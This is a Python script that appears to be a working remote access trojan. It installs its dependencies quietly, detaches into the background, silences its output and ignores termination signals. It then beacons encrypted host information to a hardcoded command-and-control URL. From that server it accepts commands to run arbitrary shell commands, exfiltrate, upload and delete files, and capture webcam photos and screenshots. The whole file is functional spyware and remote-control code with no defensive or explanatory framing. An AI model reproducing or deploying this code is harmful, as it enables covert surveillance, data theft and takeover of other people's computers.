#!/usr/bin/env python3
import os
import sys
import json
import time
import base64
import platform
import subprocess
import uuid
import shutil
import io
import signal

# ==============================================================================
# SILENT INSTALLER (Visible errors, but generally quiet)
# ==============================================================================
def install_dependencies():
    """Installs missing dependencies."""
    # Print installation status so user knows if something fails
    print("[*] Checking dependencies...", flush=True)
    
    required = {
        'psutil': 'psutil',
        'requests': 'requests',
        'cryptography': 'cryptography'
    }
    optional = {
        'cv2': 'opencv-python-headless', # Headless is smaller
        'PIL': 'Pillow',
        'mss': 'mss'
    }

    def install(package):
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", package, "-q"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"[+] Installed {package}", flush=True)
        except:
            print(f"[-] Failed to install {package}", flush=True)

    # Install required
    for mod_name, pkg_name in required.items():
        try:
            __import__(mod_name)
        except ImportError:
            print(f"[*] Installing {mod_name}...", flush=True)
            install(pkg_name)

    # Install optional (Camera/Screen)
    for mod_name, pkg_name in optional.items():
        try:
            __import__(mod_name)
        except ImportError:
            print(f"[*] Installing optional {mod_name}...", flush=True)
            install(pkg_name)

# Run install immediately (before silencing)
install_dependencies()

# ==============================================================================
# DAEMONIZE (Linux/Mac & Windows)
# ==============================================================================
def daemonize():
    """
    Detaches process from terminal.
    """
    
    # Windows Logic: Spawn detached process
    if platform.system() == "Windows":
        try:
            # Flags to make process run in background without window
            # DETACHED_PROCESS = 0x00000008
            # CREATE_NEW_PROCESS_GROUP = 0x00000200
            # CREATE_NO_WINDOW = 0x08000000
            DETACHED_PROCESS = 0x00000008
            CREATE_NEW_PROCESS_GROUP = 0x00000200
            CREATE_NO_WINDOW = 0x08000000
            
            # Spawn a new python process with the same arguments
            # The parent process (this one) will exit immediately.
            # The child continues in the background.
            subprocess.Popen(
                [sys.executable] + sys.argv,
                creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
                close_fds=True
            )
            print("[*] Background process spawned. Exiting foreground.", flush=True)
            sys.exit(0) # Exit the foreground process
        except Exception as e:
            print(f"[!] Could not daemonize Windows process: {e}", flush=True)
            # Fallback: just continue running in foreground if detach fails

    # Linux/Mac Logic: Double Fork
    try:
        # First fork
        pid = os.fork()
        if pid > 0:
            # Parent process exits -> User gets terminal back
            print("[*] Forked to background.", flush=True)
            sys.exit(0)
    except AttributeError:
        # Windows fallback (already handled above, or just skip if not Win)
        return

    # Decouple from parent environment
    try:
        os.chdir("/")
    except:
        pass
    os.setsid()
    os.umask(0)

    # Second fork (to prevent zombie process)
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except AttributeError:
        pass

    # Redirect standard file descriptors
    sys.stdout.flush()
    sys.stderr.flush()
    si = open(os.devnull, 'r')
    so = open(os.devnull, 'a+')
    se = open(os.devnull, 'a+')
    
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

# ==============================================================================
# SILENT OUTPUT (Apply AFTER daemonize/installation)
# ==============================================================================
try:
    # Redirect standard out and error to /dev/null (Null)
    # We do this here so we can see installation errors above.
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
except:
    pass

# ==============================================================================
# IMPORTS (Run after potential install)
# ==============================================================================
try:
    import psutil
    import requests
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    # If still failing after install, just exit silently
    sys.exit(0)

OPENCV_AVAILABLE = False
try:
    import cv2
    OPENCV_AVAILABLE = True
except:
    pass

PIL_AVAILABLE = False
try:
    from PIL import ImageGrab
    PIL_AVAILABLE = True
except:
    pass

MSS_AVAILABLE = False
try:
    import mss
    MSS_AVAILABLE = True
except:
    pass

# ==============================================================================
# CONFIGURATION
# ==============================================================================

SERVER_URL = "https://securitydienetforces.pythonanywhere.com" 
AES_KEY = base64.b64decode('AdqYcTHmoqWNYLMpwp9DD7ApmHKXF0VoPlt+DKyNGEY=')
HOSTNAME = f"BOT-{platform.node()}-{str(uuid.uuid4())[:4]}"
SLEEP_TIME = 5 

# ==============================================================================
# CRYPTOGRAPHY
# ==============================================================================
def encrypt_payload(data_dict):
    try:
        iv = os.urandom(12)
        cipher = AESGCM(AES_KEY)
        ciphertext = cipher.encrypt(iv, json.dumps(data_dict).encode(), None)
        return base64.b64encode(iv + ciphertext).decode()
    except:
        return None

def decrypt_response(token):
    try:
        raw = base64.b64decode(token)
        if len(raw) < 12: return None
        iv, ciphertext = raw[:12], raw[12:]
        plaintext = AESGCM(AES_KEY).decrypt(iv, ciphertext, None)
        return json.loads(plaintext)
    except:
        return None

# ==============================================================================
# SYSTEM INFO
# ==============================================================================
def get_system_info():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except:
        mac = "00:00:00:00:00:00"
    
    try:
        disk = psutil.disk_usage('/')
    except:
        disk = psutil.disk_usage('C:\\') if platform.system() == 'Windows' else psutil.disk_usage('/')
        
    return {
        "hostname": HOSTNAME,
        "mac": mac,
        "os_type": f"{platform.system()} {platform.release()}",
        "cpu_percent": psutil.cpu_percent(),
        "ram_percent": psutil.virtual_memory().percent,
        "disk_percent": disk.percent,
        "disk_total": disk.total,
        "disk_free": disk.free,
        "lat": 0.0, "lon": 0.0, "city": "", "country": ""
    }

# ==============================================================================
# COMMAND HANDLERS
# ==============================================================================
class CommandHandler:
    def __init__(self):
        self.pending_response = {}

    def execute_shell(self, cmd_str, shell_type='bash'):
        try:
            if platform.system() == "Windows":
                result = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=30, executable='/bin/bash')
            output = result.stdout + result.stderr
            self.pending_response['cmd_result'] = {"cmd": cmd_str, "output": output}
        except Exception:
            self.pending_response['cmd_result'] = {"cmd": cmd_str, "output": "Error"}

    def list_files(self, path):
        file_list = []
        try:
            path = os.path.abspath(path)
            if not os.path.exists(path): 
                # If path doesn't exist, try to return root or current dir
                # Windows specific fix: if requesting /, ensure we list drive root
                if platform.system() == "Windows" and path == "/":
                    path = os.path.splitdrive(os.getcwd())[0] + os.sep
            
            if not os.path.exists(path): return

            with os.scandir(path) as entries:
                for entry in entries:
                    try:
                        stat = entry.stat()
                        file_list.append({
                            "name": entry.name, 
                            "path": entry.path,
                            "is_dir": entry.is_dir(),
                            "size": stat.st_size if not entry.is_dir() else 0,
                            "modified": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(stat.st_mtime))
                        })
                        # Increased limit from 2000 to 5000 to capture Users folder and other files
                        if len(file_list) >= 5000: 
                            break
                    except:
                        continue
        except:
            pass
        self.pending_response['file_list'] = file_list
        self.pending_response['file_list_path'] = path

    def read_file(self, path):
        try:
            with open(path, 'rb') as f:
                content = f.read()
                if len(content) > 5 * 1024 * 1024:
                    content = b"Too large"
                self.pending_response['pushed_file'] = {"path": path, "data_b64": base64.b64encode(content).decode()}
        except:
            self.pending_response['pushed_file'] = {"path": path, "data_b64": "Error"}

    def write_file(self, dest_path, data_b64):
        try:
            os.makedirs(os.path.dirname(dest_path), exist_ok=True)
            with open(dest_path, 'wb') as f:
                f.write(base64.b64decode(data_b64))
        except:
            pass

    def delete_file(self, path):
        try:
            if os.path.isfile(path): os.remove(path)
            elif os.path.isdir(path): shutil.rmtree(path)
        except:
            pass

    def take_snapshot(self):
        if not OPENCV_AVAILABLE: return
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                self.pending_response['snapshot_b64'] = base64.b64encode(buffer).decode()
            cap.release()
        except:
            pass

    def take_screenshot(self):
        try:
            if platform.system() == "Windows":
                if PIL_AVAILABLE:
                    img = ImageGrab.grab()
                    buf = io.BytesIO()
                    img.save(buf, format='JPEG')
                    self.pending_response['screen_b64'] = base64.b64encode(buf.getvalue()).decode()
            else:
                if MSS_AVAILABLE:
                    with mss.mss() as sct:
                        monitor = sct.monitors[0]
                        img = sct.grab(monitor)
                        self.pending_response['screen_b64'] = base64.b64encode(img.rgb).decode()
        except:
            pass

# ==============================================================================
# MAIN LOOP
# ==============================================================================
def main():
    handler = CommandHandler()
    # Silence signal handlers
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)

    while True:
        try:
            payload = get_system_info()
            payload.update(handler.pending_response)
            handler.pending_response = {}

            encrypted_token = encrypt_payload(payload)
            if not encrypted_token:
                time.sleep(5)
                continue

            response = requests.post(f"{SERVER_URL}/api/ping", data=encrypted_token, timeout=10)
            
            if response.status_code == 200:
                try:
                    server_data = decrypt_response(response.json().get("enc"))
                    if not server_data: continue
                    
                    if server_data.get("status") == "die":
                        break

                    if "upload" in server_data:
                        up = server_data['upload']
                        handler.write_file(up['dest_path'], up['data_b64'])

                    cmds = server_data.get("cmds", [])
                    for cmd in cmds:
                        if cmd.startswith("shell_input"):
                            parts = cmd.split(":", 2)
                            shell_type = parts[1] if len(parts) > 1 else 'bash'
                            command = parts[2] if len(parts) > 2 else ''
                            if command: handler.execute_shell(command, shell_type)
                        elif cmd.startswith("filelist"):
                            path = cmd.split(":", 1)[1] if ':' in cmd else '/'
                            handler.list_files(path)
                        elif cmd.startswith("getfile"):
                            path = cmd.split(":", 1)[1] if ':' in cmd else ''
                            handler.read_file(path)
                        elif cmd.startswith("delete"):
                            path = cmd.split(":", 1)[1] if ':' in cmd else ''
                            handler.delete_file(path)
                        elif cmd == "snapshot": handler.take_snapshot()
                        elif cmd == "screencast_snapshot": handler.take_screenshot()
                        elif cmd == "uninstall": break
                except:
                    pass
        except:
            pass
        
        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    # 1. Daemonize (Linux/Mac) OR Spawn Detached Process (Windows)
    daemonize()
    # 2. Run Main Loop (Background, Silent)
    main()
